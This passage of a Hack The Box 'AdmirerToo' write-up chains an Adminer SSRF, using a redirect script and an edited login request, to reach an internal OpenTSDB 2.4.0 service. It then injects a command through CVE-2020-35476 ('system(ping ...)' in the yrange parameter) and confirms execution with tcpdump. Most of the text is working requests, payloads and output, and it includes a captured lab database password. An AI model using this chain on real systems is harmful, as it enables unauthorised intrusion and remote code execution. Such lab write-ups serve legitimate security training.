Redirect).serve_forever()</span><br></pre></td></tr></table></figure>

<p>Execute the python script.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># python3 ssrf_redirect.py 80 http://127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>For this to work, we need to capture the request of logging into the DB in Burp Suite. Make sure not to send this to repeater.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?server=localhost HTTP/1.1</span><br><span class="line">Host: db.admirer-gallery.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://db.admirer-gallery.htb/?server=localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 162</span><br><span class="line">Origin: http://db.admirer-gallery.htb</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: adminer_sid=29gtagudqps5momjqjgbhh7rlj; adminer_key=4f375147fa14364db1dde412c5bac310; adminer_permanent=; adminer_version=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">auth%5Bdriver%5D=server&amp;auth%5Bserver%5D=localhost&amp;auth%5Busername%5D=admirer_ro&amp;auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&amp;auth%5Bdb%5D=admirer&amp;auth%5Bpermanent%5D=1</span><br></pre></td></tr></table></figure>

<p>This is a default request. If we change ‘Auth Server’ value from ‘localhost’ to our ‘Kali IP address’ and forward the request to server, then we’d get this error.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection refused</span><br></pre></td></tr></table></figure>

<p>So, we need to edit ‘Auth Driver’ value and ‘Auth Server’ value. According to POC PDF, we need to modify auth drive value to ‘elasticsearch’ and auth server value as our attacking machine’s IP address (Kali Linux).</p>
<p><em><strong>‘Adminer’ support multiple database connection, MongoDB, MySQL, MSSQL, ElasticSearch, PostgreSQL, SqlLite and Oracle.</strong></em></p>
<p>After changing the both values, I couldn’t get a hit on our python script. Then I looked into the source of ‘Adminer’.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZyYW5hL2FkbWluZXIvdHJlZS9tYXN0ZXIvYWRtaW5lci9kcml2ZXJz">adminer&#x2F;adminer&#x2F;drivers&#x2F;<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>All the driver names and it source is available in above link.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2132.jpg"></li>
</ul>
<p>As you can see the source, the driver name is just ‘elastic’ not ‘elasticsearch’. This is the reason it didn’t work. Let’s change both values one more time.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?elasticsearch=10.10.14.8&amp;username=admirer_ro&amp;db=admirer HTTP/1.1</span><br><span class="line">Host: db.admirer-gallery.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://db.admirer-gallery.htb/?elasticsearch=10.10.14.8&amp;username=admirer_ro&amp;db=admirer</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 162</span><br><span class="line">Origin: http://db.admirer-gallery.htb</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: adminer_sid=cbd54v8p1cadk2ft514nvvkbql; adminer_key=4f375147fa14364db1dde412c5bac310; adminer_permanent=ZWxhc3RpY3NlYXJjaA%3D%3D-MTAuMTAuMTQuOA%3D%3D-YWRtaXJlcl9ybw%3D%3D-YWRtaXJlcg%3D%3D%3ALUuxevMNmJyUN51ewElaJA2hzN1Na%2BFY; adminer_version=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auth%5Bdriver%5D=elastic&amp;auth%5Bserver%5D=10.10.14.8&amp;auth%5Busername%5D=admirer_ro&amp;auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&amp;auth%5Bdb%5D=admirer&amp;auth%5Bpermanent%5D=1</span><br></pre></td></tr></table></figure>

<p>After changing values, forward the request to server and check the python script.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># python3 ssrf_redirect.py 80 http://127.0.0.1</span></span><br><span class="line">10.10.11.137 - - [23/Jan/2022 04:44:11] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br><span class="line">10.10.11.137 - - [23/Jan/2022 04:44:11] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br></pre></td></tr></table></figure>

<p>As you can see, we got 302 (redirect) hits on python script. Now check the webpage.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2133.jpg"></li>
</ul>
<p>We got the index.html source of target port 80. This simply means, we can access any locally running service. As we saw in our initial port scan that three ports are filtered. Let’s try to access them via SSRF. Setup redirector for any of the three filtered ports.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># python3 ssrf_redirect.py 80 http://127.0.0.1:4242</span></span><br></pre></td></tr></table></figure>

<p>Intercept the login request once again and check the webpage.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;meta http-equiv=content-type content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;&lt;title&gt;OpenTSDB&lt;/title&gt; &lt;style&gt;&lt;!-- body&#123;font-family:arial,sans-serif;margin-left:2em&#125;A.l:<span class="built_in">link</span>&#123;color:<span class="comment">#6f6f6f&#125;A.u:link&#123;color:green&#125;.fwf&#123;font-family:monospace;white-space:pre-wrap&#125;//--&gt;&lt;/style&gt;&lt;script type=text/javascript language=javascript src=s/queryui.nocache.js&gt;&lt;/script&gt;&lt;/head&gt; &lt;body text=#000000 bgcolor=#ffffff&gt;&lt;table border=0 cellpadding=2 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td rowspan=3 width=1% nowrap&gt;&lt;img src=s/opentsdb_header.jpg&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=#507e9b&gt;&lt;b&gt;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;div id=queryuimain&gt;&lt;/div&gt;&lt;noscript&gt;You must have JavaScript enabled.&lt;/noscript&gt;&lt;iframe src=javascript:&#x27;&#x27; id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0&gt;&lt;/iframe&gt;&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td class=subg&gt;&lt;img alt=&quot;&quot; width=1 height=6&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>As you can see, we got the response and it reveals the title name as ‘OpenTSDB’.</p>
<p><em><strong>OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.</strong></em></p>
<p>There four Vulnerabilities are present in OpenTSDB.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3ZlZGV0YWlscy5jb20vdnVsbmVyYWJpbGl0eS1saXN0L3ZlbmRvcl9pZC0xODY2Ni9wcm9kdWN0X2lkLTQ3Nzk0L09wZW50c2RiLU9wZW50c2RiLmh0bWw=">Opentsdb : Security Vulnerabilities<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Two of them are Code Execution. But we need to find the right version information of running application. To get version information, we can use the below endpoint.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># python3 ssrf_redirect.py 80 http://127.0.0.1:4242/api/version</span></span><br></pre></td></tr></table></figure>

<p>After setting the redirector for the version endpoint, capture the login request and modify it a previously and forward it to server.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;short_revision&quot;</span>:<span class="string">&quot;14ab3ef&quot;</span>,<span class="string">&quot;repo&quot;</span>:<span class="string">&quot;/home/hobbes/OFFICIAL/build&quot;</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;clhbase&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;2.4.0&quot;</span>,<span class="string">&quot;full_revision&quot;</span>:<span class="string">&quot;14ab3ef8a865816cf920aa69f2e019b7261a7847&quot;</span>,<span class="string">&quot;repo_status&quot;</span>:<span class="string">&quot;MINT&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;hobbes&quot;</span>,<span class="string">&quot;branch&quot;</span>:<span class="string">&quot;master&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;1545014415&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Alright, we got the version information. It is using 2.4.0 and RCE via command injection exists in this version.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlL0NWRS0yMDIwLTM1NDc2Lw==">CVE-2020-35476<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>The POC is already available for this vulnerability.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL09wZW5UU0RCL29wZW50c2RiL2lzc3Vlcy8yMDUx">OpenTSDB 2.4.0 Remote Code Execution<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://opentsdbhost.local/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=<span class="built_in">sum</span>:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27touch/tmp/poc.txt%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span><br></pre></td></tr></table></figure>

<p>he above is the demo link with payload which creates file in tmp directory. So we need to modify it according to our situation.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ssrf_redirect.py 80 <span class="string">&#x27;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.8%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&#x27;</span></span><br></pre></td></tr></table></figure>

<p>First we need to set the redirector via python script to exploit the vulnerability and I am injecting ping command to check the vulnerability. I will setup a tcpdump to log the incoming ICMP requests.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p>Then we need to trigger the SSRF via web. Make sure to modify the values and forward the request to server.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;err&quot;</span>:<span class="string">&quot;java.lang.RuntimeException: Unexpected exception\n\tat net.opentsdb.core.TSQuery.buildQueries(TSQuery.java:224) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.GraphHandler.doGraph(GraphHandler.java:172) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.GraphHandler.execute(GraphHandler.java:123) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.RpcHandler.handleHttpQuery(RpcHandler.java:282) [tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.RpcHandler.messageReceived(RpcHandler.java:133) [tsdb-2.4.0.jar:14ab3ef]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.timeout.IdleStateAwareChannelUpstreamHandler.handleUpstream(IdleStateAwareChannelUpstreamHandler.java:36) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.timeout.IdleStateHandler.messageReceived(IdleStateHandler.java:294) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.http.HttpContentEncoder.messageReceived(HttpContentEncoder.java:82) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelHandler.handleUpstream(SimpleChannelHandler.java:88) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.http.HttpContentDecoder.messageReceived(HttpContentDecoder.java:108) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.http.HttpChunkAggregator.messageReceived(HttpChunkAggregator.java:145) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:296) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:459) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.callDecode(ReplayingDecoder.java:536) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.messageReceived(ReplayingDecoder.java:435) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:296) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelHandler.messageReceived(SimpleChannelHandler.java:142) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelHandler.handleUpstream(SimpleChannelHandler.java:88) [netty-3.10.6.Final.jar:na]\n\tat net.opentsdb.tsd.ConnectionManager.handleUpstream(ConnectionManager.java:128) [tsdb-2.4.0.jar:14ab3ef]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:268) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:255) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:337) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.util.internal.DeadLockProofWorker<span class="variable">$1</span>.run(DeadLockProofWorker.java:42) [netty-3.10.6.Final.jar:na]\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_292]\n\tat java.util.concurrent.ThreadPoolExecutor<span class="variable">$Worker</span>.run(ThreadPoolExecutor.java:624) [na:1.8.0_292]\n\tat java.lang.Thread.run(Thread.java:748) [na:1.8.0_292]\nCaused by: com.stumbleupon.async.DeferredGroupException: At least one of the Deferreds failed, first exception:\n\tat com.stumbleupon.async.DeferredGroup.done(DeferredGroup.java:169) ~[async-1.4.0.jar:na]\n\tat com.stumbleupon.async.DeferredGroup.recordCompletion(DeferredGroup.java:142) ~[async-1.4.0.jar:na]\n\tat com.stumbleupon.async.DeferredGroup.access<span class="variable">$000</span>(DeferredGroup.java:36) ~[async-1.4.0.jar:na]\n\tat com.stumbleupon.async.DeferredGroup<span class="variable">$1Notify</span>.call(DeferredGroup.java:82) ~[async-1.4.0.jar:na]\n\tat com.stumbleupon.async.Deferred.doCall(Deferred.java:1278) ~[async-1.4.0.jar:na]\n\tat com.stumbleupon.async.Deferred.runCallbacks(Deferred.java:1257) ~[async-1.4.0.jar:na]\n\tat com.stumbleupon.async.Deferred.callback(Deferred.java:1005) ~[async-1.4.0.jar:na]\n\tat org.hbase.async.HBaseRpc.callback(HBaseRpc.java:720) ~[asynchbase-1.8.2.jar:na]\n\tat org.hbase.async.RegionClient.decode(RegionClient.java:1575) ~[asynchbase-1.8.2.jar:na]\n\tat org.hbase.async.RegionClient.decode(RegionClient.java:88) ~[asynchbase-1.8.2.jar:na]\n\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.callDecode(ReplayingDecoder.java:500) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.messageReceived(ReplayingDecoder.java:435) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.hbase.async.RegionClient.handleUpstream(RegionClient.java:1230) ~[asynchbase-1.8.2.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelHandler.messageReceived(SimpleChannelHandler.java:142) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelHandler.handleUpstream(SimpleChannelHandler.java:88) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.timeout.IdleStateAwareChannelHandler.handleUpstream(IdleStateAwareChannelHandler.java:36) ~[netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline<span class="variable">$DefaultChannelHandlerContext</span>.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.handler.timeout.IdleStateHandler.messageReceived(IdleStateHandler.java:294) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]\n\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) [netty-3.10.6.Final.jar:na]\n\tat org.hbase.async.HBaseClient<span class="variable">$RegionClientPipeline</span>.sendUpstream(HBaseClient.java:3857) ~[asynchbase-1.8.2.jar:na]\n\t... 12 common frames omitted\nCaused by: net.opentsdb.uid.NoSuchUniqueName: No such name for &#x27;metrics&#x27;: &#x27;sys.cpu.nice&#x27;\n\tat net.opentsdb.uid.UniqueId<span class="variable">$1GetIdCB</span>.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.uid.UniqueId<span class="variable">$1GetIdCB</span>.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]\n\t... 34 common frames omitted\n&quot;</span>&#125;</span><br><span class="line">......</span><br><span class="line">No such name <span class="keyword">for</span> <span class="string">&#x27;metrics&#x27;</span>: <span class="string">&#x27;sys.cpu.nice&#x27;</span>\n\tat net.opentsdb.uid.UniqueId<span class="variable">$1GetIdCB</span>.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.uid.UniqueId<span class="variable">$1GetIdCB</span>.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]\n\t... 34 common frames omitted\n<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure>

<p>After forwarding the request, we’d get this error page. The important part of this is mentioned at the end of the error.</p>
<p>The error is triggered because the ‘metrics’ which we used (sys.cpu.nice) is not available, so it couldn’t able to complete the code execution. So, we need to find the available ‘metrics’ on the application.</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL29wZW50c2RiLm5ldC9kb2NzL2J1aWxkL2h0bWwvYXBpX2h0dHAvc3VnZ2VzdC5odG1s">OpenTSDB 2.4 documentation » HTTP API » &#x2F;api&#x2F;suggest<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>To find available metrics we have to use below endpoint.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ssrf_redirect.py 80 <span class="string">&#x27;http://127.0.0.1:4242/api/suggest?type=metrics&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Then we need to trigger the SSRF via web. Make sure to modify the values and forward the request to server.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;http.stats.web.hits&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>As you can see, there’s is only one metrics available in the application. Let’s modify our redirect link accordingly.</p>
<p>Now we need to trigger the SSRF via web. Make sure to modify the values and forward the request to server. Then check the tcpdump output for ICMP reply.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># python3 ssrf_redirect.py 80 &#x27;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.8%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&#x27;</span></span><br><span class="line">10.10.11.137 - - [23/Jan/2022 05:23:01] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br><span class="line">10.10.11.137 - - [23/Jan/2022 05:23:05] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># tcpdump -i tun0 icmp</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span><br><span class="line">05:23:02.294554 IP admirer-gallery.htb &gt; 10.10.14.8: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">05:23:02.294586 IP 10.10.14.8 &gt; admirer-gallery.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">05:23:03.267590 IP admirer-gallery.htb &gt; 10.10.14.8: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">05:23:03.267611 IP 10.10.14.8 &gt; admirer-gallery.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 2, 